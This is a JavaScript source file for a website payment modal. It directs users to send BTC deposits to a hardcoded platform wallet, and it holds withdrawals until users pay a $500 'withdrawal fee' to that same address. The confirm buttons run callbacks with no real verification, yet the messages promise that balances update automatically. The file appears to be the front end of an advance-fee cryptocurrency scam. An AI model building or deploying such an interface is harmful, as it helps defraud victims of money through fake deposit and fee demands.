(function () {
  function getWallet() {
    return (window.SITE && SITE.platformWallet) || "bc1qa348fll9sh34h8gxux8dwfu4ygmwpe7v4nmyz2";
  }

  function ensureModal() {
    if (document.getElementById("wallet-modal")) return;
    document.body.insertAdjacentHTML("beforeend",
      '<div id="wallet-modal" class="wallet-modal hidden" role="dialog" aria-modal="true" aria-labelledby="wallet-modal-title">' +
        '<div class="wallet-modal-backdrop" data-wallet-modal-close></div>' +
        '<div class="wallet-modal-card app-card">' +
          '<h2 id="wallet-modal-title" class="wallet-modal-title"></h2>' +
          '<p id="wallet-modal-body" class="wallet-modal-body text-gray-400 text-sm"></p>' +
          '<div id="wallet-modal-fee" class="wallet-modal-fee hidden">' +
            '<div class="wallet-modal-fee-row"><span class="text-gray-500 text-xs">Withdrawal fee (USD)</span><strong id="wallet-modal-fee-usd" class="text-primary text-lg">$500.00</strong></div>' +
            '<div class="wallet-modal-fee-row"><span class="text-gray-500 text-xs">Withdrawal fee (BTC) · live</span><strong id="wallet-modal-fee-btc" class="text-white text-sm">—</strong></div>' +
          '</div>' +
          '<p class="text-xs text-gray-500 mb-2 mt-4">BTC wallet address</p>' +
          '<p id="wallet-modal-address" class="wallet-box"></p>' +
          '<button type="button" id="wallet-modal-copy" class="btn-ghost text-sm mt-3 w-full">Copy wallet address</button>' +
          '<div class="wallet-modal-actions">' +
            '<button type="button" class="btn-ghost" data-wallet-modal-close>Cancel</button>' +
            '<button type="button" id="wallet-modal-confirm" class="btn-primary">Confirm</button>' +
          '</div>' +
        '</div>' +
      '</div>'
    );

    document.querySelectorAll("[data-wallet-modal-close]").forEach(function (el) {
      el.addEventListener("click", WalletModal.close);
    });

    document.getElementById("wallet-modal-copy").addEventListener("click", function () {
      var addr = document.getElementById("wallet-modal-address").textContent;
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(addr).then(function () {
          document.getElementById("wallet-modal-copy").textContent = "Copied!";
          setTimeout(function () {
            document.getElementById("wallet-modal-copy").textContent = "Copy wallet address";
          }, 2000);
        });
      }
    });

    document.addEventListener("keydown", function (e) {
      if (e.key === "Escape") WalletModal.close();
    });
  }

  function getWithdrawalFee() {
    var fee = window.SITE && SITE.withdrawalFeeUsd;
    return fee != null && !Number.isNaN(Number(fee)) ? Number(fee) : 500;
  }

  function formatFeeBtc() {
    var price = window.BtcPrice && typeof BtcPrice.getLivePrice === "function"
      ? BtcPrice.getLivePrice() : (window.BtcPrice && BtcPrice.price) || 0;
    if (!price) return "—";
    return (getWithdrawalFee() / price).toFixed(6) + " BTC";
  }

  function updateFeeDisplay() {
    var feeEl = document.getElementById("wallet-modal-fee");
    if (!feeEl || feeEl.classList.contains("hidden")) return;
    var usdEl = document.getElementById("wallet-modal-fee-usd");
    var btcEl = document.getElementById("wallet-modal-fee-btc");
    if (usdEl) usdEl.textContent = "$" + getWithdrawalFee().toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    if (btcEl) btcEl.textContent = formatFeeBtc();
  }

  window.WalletModal = {
    _onConfirm: null,
    _feeTimer: null,

    open: function (opts) {
      ensureModal();
      var modal = document.getElementById("wallet-modal");
      var wallet = getWallet();
      var feeBox = document.getElementById("wallet-modal-fee");
      document.getElementById("wallet-modal-title").textContent = opts.title || "Payment Required";
      document.getElementById("wallet-modal-body").textContent = opts.message || "";
      document.getElementById("wallet-modal-address").textContent = wallet;
      document.getElementById("wallet-modal-confirm").textContent = opts.confirmLabel || "Confirm";
      if (feeBox) feeBox.classList.toggle("hidden", !opts.showFee);
      if (opts.showFee) {
        updateFeeDisplay();
        if (WalletModal._feeTimer) clearInterval(WalletModal._feeTimer);
        WalletModal._feeTimer = setInterval(updateFeeDisplay, 1000);
      }
      this._onConfirm = opts.onConfirm || null;
      modal.classList.remove("hidden");
      document.body.classList.add("wallet-modal-open");
    },

    close: function () {
      var modal = document.getElementById("wallet-modal");
      if (modal) modal.classList.add("hidden");
      document.body.classList.remove("wallet-modal-open");
      if (WalletModal._feeTimer) {
        clearInterval(WalletModal._feeTimer);
        WalletModal._feeTimer = null;
      }
      WalletModal._onConfirm = null;
    },

    showDeposit: function (amount, onConfirm) {
      this.open({
        title: "Deposit to Platform Wallet",
        message: "Send your deposit of $" + Number(amount).toLocaleString() + " (BTC equivalent) to the wallet below. It will show as Pending for 10–20 minutes, then complete automatically once verified.",
        confirmLabel: "I've Sent the Deposit",
        onConfirm: onConfirm
      });
    },

    showWithdrawFee: function (amount, onConfirm) {
      var fee = getWithdrawalFee();
      this.open({
        title: "Withdrawal Fee Required",
        showFee: true,
        message: "Before your withdrawal of $" + Number(amount).toLocaleString() + " can be processed, pay the one-time withdrawal fee of $" + fee.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " to the BTC wallet below. Your withdrawal stays Pending for 10–20 minutes; your balance updates after fee verification.",
        confirmLabel: "I've Paid the Fee",
        onConfirm: onConfirm
      });
    }
  };

  document.addEventListener("click", function (e) {
    if (e.target.id === "wallet-modal-confirm" && WalletModal._onConfirm) {
      var fn = WalletModal._onConfirm;
      WalletModal.close();
      fn();
    }
  });
})();
